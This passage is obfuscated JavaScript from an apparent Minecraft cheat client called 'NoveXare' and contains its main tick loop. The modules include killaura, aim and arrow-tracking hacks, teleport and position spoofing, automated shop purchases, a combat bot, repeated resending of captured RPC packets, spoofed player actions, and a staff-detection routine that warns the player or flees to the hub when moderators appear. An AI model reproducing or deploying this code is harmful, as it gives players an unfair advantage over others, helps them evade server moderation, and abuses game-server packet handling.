        selectPlayerInventorySlot(self_id, getItem(self_id, _0xf1c6a2, -1, "一局"));
        const _0x2b4b6b = getEntityCarriedItem(self_id);
        if (_0x2b4b6b.name.includes("一局")) {
          useItem();
        }
      }
    }
  }
  if (auto_click) {
    buildBlock(self_id, _0x25c02a.x, _0x25c02a.y - 1, _0x25c02a.z, 1);
  }
  if (autobuy && tickCounter > 10) {
    var _0x342219 = {};
    _0x342219.gold = getItemCount(-1, "minecraft:gold_ingot");
    _0x342219.iron = getItemCount(-1, "minecraft:iron_ingot");
    _0x342219.diamond = getItemCount(-1, "minecraft:diamond");
    _0x342219.emerald = getItemCount(-1, "minecraft:emerald");
    _0x342219.star = getItemCount(-1, "minecraft:nether_star");
    var _0x14ec38 = _0x342219;
    const _0x1e3112 = (_0x555b5e, _0x10eb8a, _0x581fd0) => {
      HYTShopMod(..._0x555b5e);
      BJD_NBedwarsBuyItemEvent(..._0x10eb8a);
      var _0x413980 = {};
      _0x413980.gold = getItemCount(-1, "minecraft:gold_ingot");
      _0x413980.iron = getItemCount(-1, "minecraft:iron_ingot");
      _0x413980.diamond = getItemCount(-1, "minecraft:diamond");
      _0x413980.emerald = getItemCount(-1, "minecraft:emerald");
      _0x413980.star = getItemCount(-1, "minecraft:nether_star");
      _0x14ec38 = _0x413980;
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + _0x581fd0);
      }
    };
    if (autobuy_sword) {
      if (max_damage < 8 && _0x14ec38.diamond >= 6) {
        _0x1e3112(["2", "3"], ["剑", 2], "自动购买钻石剑");
        max_damage = getEntityMaxDamage(self_id);
      } else if (max_damage < 8 && _0x14ec38.emerald >= 6) {
        _0x1e3112([], ["剑", 2], "自动购买钻石剑");
        max_damage = getEntityMaxDamage(self_id);
      } else if (max_damage < 7 && _0x14ec38.gold >= 7) {
        _0x1e3112(["2", "2"], ["剑", 1], "自动购买铁剑");
        max_damage = getEntityMaxDamage(self_id);
      } else if (max_damage < 5 && _0x14ec38.iron >= 10) {
        _0x1e3112(["2", "1"], ["剑", 0], "自动购买石剑");
        max_damage = getEntityMaxDamage(self_id);
      }
    }
    if (autobuy_block && getItemCount(-1, "minecraft:wool") < autobuy_block_count * 16 && _0x14ec38.iron >= 4) {
      _0x1e3112(["1", "1"], ["方块", 0], "自动购买方块");
    }
    if (autobuy_armor) {
      if (hasBrought.armor <= 2 && _0x14ec38.diamond >= 8) {
        _0x1e3112(["3", "3"], [], "自动购买钻套");
        hasBrought.armor = 3;
      } else if (hasBrought.armor <= 1 && _0x14ec38.emerald >= 6) {
        _0x1e3112([], ["装备", 2], "自动购买钻套");
        hasBrought.armor = 2;
      } else if (hasBrought.armor <= 1 && _0x14ec38.gold >= 12) {
        _0x1e3112(["3", "2"], ["装备", 1], "自动购买铁套");
        hasBrought.armor = 2;
      } else if (hasBrought.armor <= 0 && _0x14ec38.iron >= 35) {
        _0x1e3112(["3", "1"], [], "自动购买锁链套");
        hasBrought.armor = 1;
      } else if (hasBrought.armor <= 0 && _0x14ec38.iron >= 24) {
        _0x1e3112([], ["装备", 0], "自动购买锁链套");
        hasBrought.armor = 1;
      }
    }
    if (autobuy_enchant) {
      if (hasBrought.enchant.sharp <= 1 && _0x14ec38.star >= 10) {
        _0x1e3112(["8", "1"], [], "自动升级锋利2");
        hasBrought.enchant.sharp = 2;
      } else if (hasBrought.enchant.protect <= 1 && _0x14ec38.star >= 10) {
        _0x1e3112(["8", "2"], [], "自动升级保护2");
        hasBrought.enchant.protect = 2;
      } else if (hasBrought.enchant.sharp <= 0 && _0x14ec38.star >= 6) {
        _0x1e3112(["8", "1"], [], "自动升级锋利1");
        hasBrought.enchant.sharp = 1;
      } else if (hasBrought.enchant.protect <= 0 && _0x14ec38.star >= 6) {
        _0x1e3112(["8", "2"], [], "自动升级保护1");
        hasBrought.enchant.protect = 1;
      }
    }
    tickCounter = 0;
  }
  if (goto_pos != null) {
    const _0x3742e0 = getHorizontalDistance(self_pos, goto_pos);
    const _0x3c65f4 = getDistance(self_pos, goto_pos);
    if (_0x3c65f4 >= 5) {
      if (_0x3742e0 >= 1) {
        let _0x21dc9a = getPlayerAngle(self_id, goto_pos, "yaw_pos");
        var _0x19f0a2 = {
          yaw: _0x21dc9a,
          pitch: 0
        };
        let _0x3f0826 = getDisplacement(-1.5, self_pos, _0x19f0a2);
        setPos(_0x3f0826.x, self_pos.y, _0x3f0826.z);
      } else {
        let _0x2c403a = -getPlayerAngle(self_id, goto_pos, "pitch_pos");
        var _0x396a3a = {
          yaw: 0,
          pitch: _0x2c403a
        };
        let _0x4ee4bc = getDisplacement(-3, self_pos, _0x396a3a);
        setPos(self_pos.x, _0x4ee4bc.y, self_pos.z);
      }
    } else {
      goto_pos = null;
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "已设置到达目的地");
      }
    }
  }
  if (chestaura) {
    const _0x43f6e2 = getPlayerBlockPos(self_id);
    for (let _0x1043dc = -2; _0x1043dc < 3; _0x1043dc++) {
      for (let _0x455c8c = -2; _0x455c8c < 3; _0x455c8c++) {
        for (let _0x3bbd54 = -2; _0x3bbd54 < 3; _0x3bbd54++) {
          const _0x30cd90 = getBlock(_0x43f6e2.x + _0x1043dc, _0x43f6e2.y + _0x455c8c, _0x43f6e2.z + _0x3bbd54);
          const _0x5cc4b4 = obj2str([_0x43f6e2.x + _0x1043dc, _0x43f6e2.y + _0x455c8c, _0x43f6e2.z + _0x3bbd54]);
          if (_0x30cd90.namespace == "minecraft:chest" && !chest_pos.includes(_0x5cc4b4) && !isOpenChest) {
            buildBlock(self_id, _0x43f6e2.x + _0x1043dc, _0x43f6e2.y + _0x455c8c, _0x43f6e2.z + _0x3bbd54, 0);
            chest_pos.push(_0x5cc4b4);
          }
        }
      }
    }
  }
  if (anti_staff) {
    _0x4a1836.map(_0x338cea => {
      let _0x4b0fad = getEntityName(_0x338cea);
      if (_0x338cea != self_id && _0x4b0fad != "") {
        let _0x232afa = false;
        if (func_mode.anti_staff_mode == 0 && (!_0x4b0fad.includes("§") || !_0x4b0fad.includes("[") || !_0x4b0fad.includes("]")) && !_0x4b0fad.includes("锭")) {
          _0x232afa = true;
        }
        if (func_mode.anti_staff_mode == 1 && (_0x4b0fad.includes("管") && _0x4b0fad.includes("理") && _0x4b0fad.includes("员") || _0x4b0fad.includes("管理员"))) {
          _0x232afa = true;
        }
        if (func_mode.anti_staff_mode == 2 && getEntityFlag(_0x338cea, 5)) {
          _0x232afa = true;
        }
        if (_0x232afa) {
          if (func_mode.anti_mode == 0) {
            clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "可能存在协管: " + _0x4b0fad);
          } else if (func_mode.anti_mode == 1) {
            executeCommand("/hub");
          } else if (func_mode.anti_mode == 2) {
            executeCommand("/again");
          }
        }
      }
    });
  }
  if (InteractAura) {
    target_list.map(_0x2a5db0 => interactEntity(_0x2a5db0));
  }
  if (tower && _0x513051.pitch < -80) {
    const _0x4c69af = getEntityCarriedItem(self_id);
    if (_0x4c69af.namespace != "minecraft:air") {
      setMotion(0, 0.2, 0);
      const _0x52785b = getBlock(_0x25c02a.x, _0x25c02a.y - 1, _0x25c02a.z);
      if (_0x52785b.namespace == "minecraft:air") {
        HYTBuild(_0x25c02a.x, _0x25c02a.y - 1, _0x25c02a.z);
      }
    }
  }
  if (show_variable) {
    if (variable_player && last_world_player.length != _0x4a1836.length) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "玩家数量发生变化 " + last_world_player.length + " => " + _0x4a1836.length);
      last_world_player = _0x4a1836;
    }
    if (variable_id && self_id != last_tick_id) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "玩家本地ID发生变化 " + last_tick_id + " => " + self_id);
    }
  }
  if (check_axe) {
    const _0x418dfa = _0x4a1836;
    var _0x41f029 = [];
    _0x418dfa.map(_0x58c94e => {
      if (getItem(_0x58c94e, "golden_axe")) {
        _0x41f029.push(getEntityName(_0x58c94e));
      }
    });
    if (_0x41f029.length > 0) {
      _0x2c4c04.push("§rTip §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "下列玩家背包可能存在秒人斧:" + obj2str(_0x41f029));
    }
  }
  if (show_world_tip && last_world_player.length != _0x4a1836.length) {
    const _0x1fb65a = subtraction(last_world_player, _0x4a1836);
    const _0x177df5 = _0x1fb65a.map(_0x55957d => getEntityName(_0x55957d));
    if (last_world_player.length < _0x4a1836.length) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + obj2str(_0x177df5) + "进入了世界");
    }
    if (last_world_player.length > _0x4a1836.length) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + obj2str(_0x177df5) + "离开了世界");
    }
    last_world_player = _0x4a1836;
  }
  if (drop_res && _0x1b6f06.y < -drop_motion) {
    for (index = 0; index < 36; index++) {
      const _0x529912 = getPlayerInventoryItem(self_id, index);
      if (resList.includes(_0x529912.namespace)) {
        dropPlayerInventorySlot(self_id, index);
      }
    }
  }
  if (attack_aim) {
    const _0x1205e4 = getEntityList();
    if (aim_t1 - aim_t0 > Math.round(1000 / aim_attack_cps) - 50) {
      _0x1205e4.map(_0x31e62b => {
        if (isAimed(self_id, _0x31e62b, 15, 0)) {
          attack(_0x31e62b, attack_action);
        }
      });
      aim_t0 = aim_t1;
    }
    aim_t1 = Date.now();
  }
  if (select_hotbar) {
    let _0x16ad56 = getPlayerInventoryItem(self_id, select_slot);
    if (selectitems.includes(_0x16ad56.name) || selectitems.includes(_0x16ad56.namespace) || selectitems.length == 0) {
      selectPlayerInventorySlot(self_id, select_slot);
      const _0x4ac339 = getEntityCarriedItem(self_id);
      if (select_use && !_0x4ac339.namespace.includes("air")) {
        useItem();
      }
    }
  }
  if (drop_armor && (!da_bow || _0x513051.pitch > 80)) {
    const _0x754a8e = ["helmet", "chestplate", "leggings", "boots"];
    const _0x52d5a1 = [max_armor[0], max_armor[1], max_armor[2], max_armor[3]];
    for (let _0x5198f7 = 35; _0x5198f7 > -1; _0x5198f7--) {
      const _0x1879c3 = getItemType(self_id, _0x5198f7);
      if (_0x1879c3 === "other") {
        continue;
      }
      const _0x1c8609 = getItemCount(_0x5198f7);
      const _0x2ebf70 = getItemDamage(self_id, _0x5198f7);
      const _0x375d0b = getItemArmor(self_id, _0x5198f7);
      if ((_0x1879c3 === "sword" || _0x1879c3 === "axe" || _0x1879c3 === "pickaxe") && (_0x2ebf70 < max_damage || _0x1c8609 > 1)) {
        dropPlayerInventorySlot(self_id, _0x5198f7);
      }
      const _0x1945ae = _0x754a8e.indexOf(_0x1879c3);
      if (_0x1945ae !== -1 && (_0x375d0b < _0x52d5a1[_0x1945ae] || _0x1c8609 > 1)) {
        dropPlayerInventorySlot(self_id, _0x5198f7);
      }
    }
  }
  if (autoarmor) {
    let _0x2050a5 = getItemType(self_id, armor_slot);
    if (_0x2050a5 != "other") {
      if (_0x2050a5 == "helmet" && (CurrentArmor.helmet == undefined || getItemArmor(self_id, armor_slot) > getItemArmor(self_id, -1, CurrentArmor[_0x2050a5]))) {
        useArmor(armor_slot);
      }
      if (_0x2050a5 == "chestplate" && (CurrentArmor.chestplate == undefined || getItemArmor(self_id, armor_slot) > getItemArmor(self_id, -1, CurrentArmor[_0x2050a5]))) {
        useArmor(armor_slot);
      }
      if (_0x2050a5 == "leggings" && (CurrentArmor.leggings == undefined || getItemArmor(self_id, armor_slot) > getItemArmor(self_id, -1, CurrentArmor[_0x2050a5]))) {
        useArmor(armor_slot);
      }
      if (_0x2050a5 == "boots" && (CurrentArmor.boots == undefined || getItemArmor(self_id, armor_slot) > getItemArmor(self_id, -1, CurrentArmor[_0x2050a5]))) {
        useArmor(armor_slot);
      }
    }
  }
  if (remove_item) {
    const _0x362173 = getEntityList();
    _0x362173.map(_0x349d85 => {
      if (getEntityTypeId(_0x349d85) == 64) {
        removeEntity(_0x349d85);
      }
    });
  }
  if (remove_notPlayer) {
    const _0x83485e = getEntityList();
    _0x83485e.map(_0x528573 => {
      if (!isPlayer(_0x528573)) {
        removeEntity(_0x528573);
      }
    });
  }
  if (_0x2ecb85.count <= 0 && last_tick_item.count > 0 && last_tick_item.id != 0 && auto_select) {
    for (let _0xa5781b = 8; _0xa5781b >= 0; _0xa5781b--) {
      let _0x8101eb = getPlayerInventoryItem(self_id, _0xa5781b);
      if (_0x8101eb.namespace == last_tick_item.namespace) {
        selectPlayerInventorySlot(self_id, _0xa5781b);
      }
    }
  }
  if (freecam && freecam_pos != {}) {
    if (freecam_show) {
      for (let _0x2dd5d9 = 0; _0x2dd5d9 <= 18; _0x2dd5d9 += 2) {
        drawParticle(55, freecam_pos.x, freecam_pos.y - 1.53 + _0x2dd5d9 / 10, freecam_pos.z, 1);
      }
      _0x2c4c04.push("§rTip §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "本体坐标: " + string_format("[X:{}, Y:{}, Z:{}]", freecam_pos.x.toFixed(2), freecam_pos.y.toFixed(2), freecam_pos.z.toFixed(2)));
    }
    if (freecam_dis) {
      _0x2c4c04.push("§rTip §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "本体距离:" + getDistance(self_pos, freecam_pos).toFixed(2) + "m");
    }
  }
  if (fake_move && fakemove_pos != {}) {
    for (let _0x483eea = 0; _0x483eea <= 18; _0x483eea += 2) {
      drawParticle(55, fakemove_pos.x, fakemove_pos.y - 1.53 + _0x483eea / 10, fakemove_pos.z, 1);
    }
    _0x2c4c04.push("§rTip §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "本体坐标: " + string_format("[X:{}, Y:{}, Z:{}]", fakemove_pos.x.toFixed(2), fakemove_pos.y.toFixed(2), fakemove_pos.z.toFixed(2)));
    _0x2c4c04.push("§rTip §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "本体距离:" + getDistance(self_pos, fakemove_pos).toFixed(2) + "m");
  }
  if (remove_player) {
    const _0x3d7a3a = getPlayerList();
    _0x3d7a3a.map(_0x22af7b => {
      if (_0x22af7b != self_id) {
        removeEntity(_0x22af7b);
      }
    });
  }
  if (bow_trace) {
    const _0xdcfba6 = getEntityList();
    _0xdcfba6.map(_0x186892 => {
      if (getEntityTypeId(_0x186892) == 12582992 && target_list.length > 0) {
        const _0x3c1226 = getEntityPos(target_list[0]);
        let _0x5af6a0 = getPlayerAngle(_0x3c1226, getEntityPos(_0x186892), "yaw_pos");
        let _0x5ab2a7 = getPlayerAngle(_0x3c1226, getEntityPos(_0x186892), "pitch_pos");
        const _0x44a4eb = getEntityPos(_0x186892);
        var _0x4411dd = {
          yaw: _0x5af6a0,
          pitch: _0x5ab2a7
        };
        const _0x522b63 = getDisplacement(bow_speed, _0x44a4eb, _0x4411dd);
        setEntityMotion(_0x186892, _0x522b63.x - _0x44a4eb.x, _0x522b63.y - _0x44a4eb.y, _0x522b63.z - _0x44a4eb.z);
      }
    });
    if (target_list.length > 0) {
      _0x2c4c04.push("§rTip §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "LockedTarget:" + getEntityName(target_list[0]));
    }
  }
  if (arrow_fly) {
    const _0x2cbcd4 = getEntityList();
    _0x2cbcd4.map(_0x4284c0 => {
      if (getEntityTypeId(_0x4284c0) == 12582992) {
        const _0x3ceb43 = getEntityPos(_0x4284c0);
        if (arrow_rot[_0x4284c0] == undefined) {
          arrow_rot[_0x4284c0] = _0x513051;
        }
        const _0x17ce40 = arrow_rot[_0x4284c0].yaw;
        const _0x1a6760 = arrow_rot[_0x4284c0].pitch;
        var _0xe7c6f1 = {
          yaw: _0x17ce40,
          pitch: _0x1a6760
        };
        const _0x42fa18 = getDisplacement(1, _0x3ceb43, _0xe7c6f1);
        setEntityMotion(_0x4284c0, _0x42fa18.x - _0x3ceb43.x, _0x42fa18.y - _0x3ceb43.y, _0x42fa18.z - _0x3ceb43.z);
      }
    });
  }
  if (auto_stuck) {
    for (let _0xf1464f = 0; _0xf1464f < fps_rate * 10; _0xf1464f++) {
      for (let _0x45e500 = 0; _0x45e500 < fps_rate * 5; _0x45e500++) {
        log(_0xf1464f + _0x45e500);
      }
    }
  }
  if (arrow_particle) {
    const _0x3ffa2a = getEntityList();
    _0x3ffa2a.map(_0x378470 => {
      if (getEntityNamespace(_0x378470) == "minecraft:arrow") {
        const _0x5d237a = getEntityPos(_0x378470);
        drawParticle(arrow_particle_type, _0x5d237a.x, _0x5d237a.y, _0x5d237a.z, 3);
      }
    });
  }
  if (fightbot && target_list.length > 0) {
    let _0x455243 = getEntityPos(target_list[0]);
    let _0x40ef6c = getPlayerBlockPos(target_list[0]);
    const _0x588461 = (_0x116e53 ? -0.278 : -0.293) - fightbot_speed * Number(!fightbot_imitateMove) / 5;
    const _0x2f087e = getEntityCarriedItem(self_id);
    if (fightbot_random_move && getRandomNum(0, 100) < fightbot_move_rate) {
      var _0xbf5665 = {};
      _0xbf5665.yaw = getRandomNum(0, 1) ? 90 : -90;
      _0xbf5665.pitch = 0;
      _0x455243 = getDisplacement(3, _0x455243, _0xbf5665);
    }
    let _0x4b691a = getPlayerAngle(self_id, _0x455243, "yaw_pos");
    let _0x2ba9f9 = getPlayerAngle(self_id, _0x455243, "pitch_pos");
    var _0x96475f = {
      yaw: _0x4b691a,
      pitch: 0
    };
    let _0x5bb3d7 = getDisplacement(_0x588461, getEntityPos(self_id), _0x96475f);
    const _0x57c26b = getBlock(_0x40ef6c.x, _0x40ef6c.y - 1, _0x40ef6c.z);
    if (_0x5c8ff1.current < fightbot_pot_health) {
      if (_0x2f087e.namespace !== "minecraft:splash_potion" || _0x2f087e.aux !== 22) {
        selectPlayerInventorySlot(self_id, getItem(self_id, "splash_potion", 22));
      } else {
        setLocalPlayerTurn(-90, 0);
        if (_0x2f087e.namespace.includes("splash_potion")) {
          setTimeout(() => useItem(), 75);
        }
      }
    }
    const _0x249f42 = getHorizontalDistanceByID(self_id, target_list[0]);
    if (_0x249f42 > fightbot_distance) {
      if (_0x1b6f06.y > -0.42 && _0x1b6f06.y < 0.42) {
        setEntityMotion(self_id, _0x5bb3d7.x - self_pos.x, (fightbot_jump || getRandomNum(0, 100) < fightbot_jump_rate && fightbot_random_jump) && _0x1b6f06.y > -0.0785 && _0x1b6f06.y < -0.0783 ? fightbot_height : _0x1b6f06.y, _0x5bb3d7.z - self_pos.z);
      }
      killaura = false;
      wtap = false;
      if (fightbot_scaffold && !_0x116e53) {
        scaffold = true;
      }
      if (getRandomNum(0, 100) < fightbot_fishhook_rate && isAimed(self_id, target_list[0], 20, 0) && _0x249f42 < fightbot_distance * 3) {
        selectPlayerInventorySlot(self_id, getItem(self_id, "fishing_rod"));
        if (_0x2f087e.namespace.includes("fishing_rod")) {
          useItem();
        }
      }
    } else {
      if (getRandomNum(0, 100) < fightbot_snowball_rate && isAimed(self_id, target_list[0], 20, 0)) {
        selectPlayerInventorySlot(self_id, getItem(self_id, "snowball"));
        if (_0x2f087e.namespace.includes("snowball")) {
          useItem();
        }
      }
      if (_0x116e53 && _0x1b6f06.y > -0.0785 && _0x1b6f06.y < -0.0783) {
        setEntityMotion(self_id, fightbot_random_move && getRandomNum(0, 100) < fightbot_move_rate ? _0x5bb3d7.x - self_pos.x : _0x1b6f06.x, fightbot_combo && _0x57c26b.namespace === "minecraft:air" && _0x1b6f06.y > -0.0785 && _0x1b6f06.y < -0.0783 ? fightbot_height : _0x1b6f06.y, fightbot_random_move && getRandomNum(0, 100) < fightbot_move_rate ? _0x5bb3d7.z - self_pos.z : _0x1b6f06.z);
      }
      if (fightbot_autoweapon) {
        selectPlayerInventorySlot(self_id, getItem(self_id, "sword"));
      }
      if (fightbot_killaura) {
        killaura = true;
      }
      if (fightbot_wtap) {
        wtap = true;
      }
      if (fightbot_aimbot) {
        assistaim = true;
      }
      scaffold = false;
    }
  }
  if (RainbowWool) {
    for (let _0x1649a4 = -1; _0x1649a4 <= 2; _0x1649a4++) {
      for (let _0x585a39 = -2; _0x585a39 <= 2; _0x585a39++) {
        setBlock(_0x25c02a.x + _0x1649a4, _0x25c02a.y - 1, _0x25c02a.z + _0x585a39, "wool", getRandomNum(0, 15));
      }
    }
  }
  if (circulateSender && rpc_t > RepeatRpc_ticks) {
    for (let _0x361274 = 0; _0x361274 < RepeatRpc_times; _0x361274++) {
      sendRpc(last_PyRpc.id, last_PyRpc.data);
    }
    rpc_t = 0;
  }
  if (auto_use) {
    for (let _0x12bcfc = 0; _0x12bcfc < use_times; _0x12bcfc++) {
      useItem();
    }
  }
  if (auto_swimming) {
    sendPlayerAction({
      id: getLocalPlayerUniqueID(),
      pos: getEntityPos(getLocalPlayerUniqueID()),
      value: 1,
      type: 21
    });
  }
  if (auto_swing) {
    sendPlayerAction({
      id: getLocalPlayerUniqueID(),
      pos: getEntityPos(getLocalPlayerUniqueID()),
      value: 1,
      type: 31
    });
  }
  if (auto_shift && shift_tick_r > shift_tick) {
    sendPlayerAction({
      id: getLocalPlayerUniqueID(),
      pos: getEntityPos(getLocalPlayerUniqueID()),
      value: 1,
      type: 11
    });
    shift_tick_r = 0;
  }
  if (AutoCrystal && target_list.length > 0) {
    const _0x433bc9 = getEntityCarriedItem(self_id);
    if (SelectCrystal) {
      selectPlayerInventorySlot(self_id, getItem(self_id, "end_crystal"));
    }
    if (_0x433bc9.namespace == "minecraft:end_crystal" && t_c > crystal_delay) {
      let _0x519b22 = 0;
      target_list.map(_0xed4651 => {
        if (getEntityTypeId(_0xed4651) != 71) {
          let _0x5dbd58 = getPlayerBlockPos(_0xed4651);
          if (CrystalTP) {
            setPos(_0x5dbd58.x, _0x5dbd58.y + 1, _0x5dbd58.z);
          }
          for (let _0xf144af = -2; _0xf144af < 3; _0xf144af++) {
            for (let _0x146721 = -2; _0x146721 < 3; _0x146721++) {
              for (let _0x2aa126 = -2; _0x2aa126 < 3; _0x2aa126++) {
                let _0x46d795 = getBlock(_0x5dbd58.x + _0xf144af, _0x5dbd58.y + _0x2aa126, _0x5dbd58.z + _0x146721);
                if ((_0x46d795.namespace == "minecraft:bedrock" || _0x46d795.namespace == "minecraft:obsidian") && _0x519b22 < crystal_acount) {
                  buildBlock(self_id, _0x5dbd58.x + _0xf144af, _0x5dbd58.y + _0x2aa126, _0x5dbd58.z + _0x146721, 1);
                  _0x519b22 += 1;
                }
              }
            }
          }
        }
      });
      t_c = 0;
    } else {
      _0x2c4c04.push("§rTip §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "请手持水晶");
    }
  }
  if (CrystalAura) {
    const _0xb18b06 = getEntityList();
    _0xb18b06.map(_0x556f2a => {
      if (getEntityTypeId(_0x556f2a) == 71 && getDistanceByID(_0x556f2a, target_list[0]) < CrystalAura_distance) {
        attack(_0x556f2a, attack_action);
      }
    });
  }
  if (AutoBomb && target_list.length > 0) {
    const _0x3883c9 = getEntityCarriedItem(self_id);
    if (SelectBomb) {
      selectPlayerInventorySlot(self_id, getItem(self_id, "respawn_anchor"));
    }
    if (_0x3883c9.namespace == "minecraft:respawn_anchor" && t_b > bomb_delay) {
      target_list.map(_0x4fc420 => {
        let _0x9ec1dc = getPlayerBlockPos(_0x4fc420);
        let _0x2c6a43 = getBlock(_0x9ec1dc.x, _0x9ec1dc.y + 2, _0x9ec1dc.z);
        if (_0x2c6a43.namespace == "minecraft:air") {
          buildBlock(self_id, _0x9ec1dc.x, _0x9ec1dc.y + 2, _0x9ec1dc.z, 0);
        }
        _0x2c6a43 = getBlock(_0x9ec1dc.x, _0x9ec1dc.y + 2, _0x9ec1dc.z);
        if (_0x2c6a43.namespace == "minecraft:respawn_anchor") {
          buildBlock(self_id, _0x9ec1dc.x, _0x9ec1dc.y + 2, _0x9ec1dc.z, 0);
        }
      });
      t_b = 0;
    } else {
      _0x2c4c04.push("§rTip §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "请手持重生锚");
    }
  }
  if (auto_destroy_foot && target_list.length > 0) {
    target_list.map(_0x4c2fb0 => {
      const _0x273d3c = getPlayerBlockPos(_0x4c2fb0);
      destroyBlock(self_id, _0x273d3c.x, _0x273d3c.y - 1, _0x273d3c.z, 6);
    });
  }
  if (cpvp && target_list.length > 0) {
    target_list.map(_0x249cdc => {
      const _0x158a7b = getPlayerBlockPos(_0x249cdc);
      let _0x3b7649 = [[_0x158a7b.x, _0x158a7b.y + 2, _0x158a7b.z], [_0x158a7b.x + 1, _0x158a7b.y, _0x158a7b.z], [_0x158a7b.x - 1, _0x158a7b.y, _0x158a7b.z], [_0x158a7b.x, _0x158a7b.y, _0x158a7b.z + 1], [_0x158a7b.x, _0x158a7b.y, _0x158a7b.z - 1], [_0x158a7b.x + 1, _0x158a7b.y + 1, _0x158a7b.z], [_0x158a7b.x - 1, _0x158a7b.y + 1, _0x158a7b.z], [_0x158a7b.x, _0x158a7b.y + 1, _0x158a7b.z + 1], [_0x158a7b.x, _0x158a7b.y + 1, _0x158a7b.z - 1]];
      for (_0xddd8e of _0x3b7649) {
        let _0xe882c = getBlock(_0xddd8e[0], _0xddd8e[1], _0xddd8e[2]);
        if (_0xe882c.namespace == "minecraft:air" && func_mode.cpvp_mode == 1) {
          buildBlock(self_id, _0xddd8e[0], _0xddd8e[1], _0xddd8e[2], 1);
        }
        if (_0xe882c.namespace != "minecraft:air" && func_mode.cpvp_mode == 0) {
          destroyBlock(self_id, _0xddd8e[0], _0xddd8e[1], _0xddd8e[2], 1);
        }
      }
    });
  }
  if (killaura && target_list.length > 0) {
    killaura_d_1 = Date.now();
    var _0x41f029 = [];
    var _0x475530 = getEntityPos(self_id);
    _0x475530.y += 1.53;
    target_list.map(_0x4b2494 => {
      var _0xdb74b9 = getEntityPos(_0x4b2494);
      _0xdb74b9.y += 0.9;
      if ((getDistanceByID(self_id, _0x4b2494) <= killaura_distance || killaura_infinite) && isAimed(self_id, _0x4b2494, killaura_Fov, 0) && noWall(_0x475530, _0xdb74b9, !through_wall) && (!killaura_crit || _0x1b6f06.y < -0.0784)) {
        if (killaura_d_1 - killaura_d_2 > 0) {
          for (k = 0; k < killaura_boost; k++) {
            attack(_0x4b2494, attack_action);
          }
          random_num = getRandomNum(killaura_min_cps, killaura_max_cps);
          random_delay = Math.round(1000 / random_num);
          killaura_d_2 = killaura_d_1 + random_delay;
        }
        _0x41f029.push(getEntityName(_0x4b2494));
      }
    });
    if (show_tip && _0x41f029.length > 0) {
      _0x2c4c04.push("§rAttack §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "" + obj2str(_0x41f029));
    }
    const _0x3adce5 = _0x41f029.length * random_num * killaura_boost;
    if (show_cps && show_tip && _0x3adce5 > 0) {
      _0x2c4c04.push("§rCPS §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "" + _0x3adce5 + "/s");
    }
  }
  if (RunAway) {
    setPos(100000, 100000, 100000);
  }
  if (slowdown && _0x1b6f06.y < -slowdown_speed / 30) {
    setMotion(_0x1b6f06.x, -slowdown_speed / 30, _0x1b6f06.z);
  }
  if (derp) {
    var _0x5faf4d = {
      pitch: derp_p_r,
      yaw: derp_y_r
    };
    var _0x17abde = {
      id: self_id,
      pos: self_pos,
      mode: 1,
      ground: _0x116e53,
      rot: _0x5faf4d,
      yHeadRot: derp_p_r
    };
    sendMovePlayer(_0x17abde);
    if (self_can_see) {
      setEntityRot(self_id, derp_p_r, derp_y_r);
      setEntityBodyRot(self_id, derp_y_r);
    }
  }
  if (surround_particle && (_0x2ee94b > 0.5 || !only_walk)) {
    surround_particle_yaw = surround_particle_yaw + particle_surround_speed * 3;
    if (surround_particle_yaw > 180) {
      surround_particle_yaw = -180;
    }
    var _0x4d0ae8 = {
      yaw: surround_particle_yaw,
      pitch: 0
    };
    var _0x1c383e = getDisplacement(surround_particle_length, self_pos, _0x4d0ae8);
    drawParticle(surround_particle_type, _0x1c383e.x, _0x1c383e.y - 1.8 + surround_particle_heigh, _0x1c383e.z, surround_particle_size);
  }
  if (tp_list.length > 0) {
    const _0x1925e1 = tp_list.shift();
    buildBlock(self_id, _0x1925e1[0], _0x1925e1[1], _0x1925e1[2], 0);
    setPos(_0x1925e1[0], _0x1925e1[1], _0x1925e1[2]);
    destroyBlock(self_id, _0x1925e1[0], _0x1925e1[1], _0x1925e1[2], 1);
    if (tp_list.length === 1) {
      callModule(35, "{\"value\":false,\"count\":18}");
    }
  }
  if (motion_list.length > 0) {
    const _0x33da98 = motion_list.shift();
    setMotion(_0x33da98[0], _0x33da98[1], _0x33da98[2]);
  }
  if (scaffold && !_0x2ecb85.namespace.includes("spawn") && !_0x2ecb85.namespace.includes("sword") && !_0x2ecb85.namespace.includes("pickaxe")) {
    const _0x534fb5 = getBlock(_0x25c02a.x, rec_y - 1, _0x25c02a.z);
    if (show_tip && getItemCount(-1) < 4) {
      _0x2c4c04.push("§cWarning §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "手持方块不足!");
    }
    const _0x1b7b61 = predictEntityPos(getEntityMotion(self_id), getEntityPos(self_id), 5);
    const _0x5b2072 = scaffold_move ? getPlayerAngle(_0x1b7b61, self_id, "yaw_pos") : _0x513051.yaw;
